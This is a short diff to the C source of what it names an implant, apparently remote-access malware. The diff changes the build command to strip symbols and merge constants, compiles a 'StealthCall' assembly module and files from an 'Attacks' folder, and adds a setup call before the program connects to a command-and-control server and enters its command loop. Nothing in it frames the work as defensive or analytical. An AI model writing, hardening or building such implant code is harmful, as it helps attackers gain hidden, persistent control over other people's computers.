@@ -10,7 +10,7 @@
 #pragma comment(lib, "wininet.lib")
 
 /*
-	nasm -f win64 .\Lib\StealthCall.asm -o .\Lib\StealthCall.o && gcc .\implant.c .\helper.c .\Attacks\*.c .\Lib\*.c .\Lib\*.o -lwininet -lws2_32 -o implant.exe
+	nasm -f win64 .\Lib\StealthCall.asm -o .\Lib\StealthCall.o ; gcc -s -fmerge-all-constants .\implant.c .\helper.c .\Attacks\*.c .\Lib\*.c .\Lib\*.o -lwininet -lws2_32 -o implant.exe
 */
 
 int main() {
@@ -19,6 +19,7 @@ int main() {
     BOOL loop = 1;
     SIZE_T pe_sz = 0;
     PBYTE pe;
+    SetupConstants();
 
     ConnectToC2(&c2Socket);
     while(loop) {
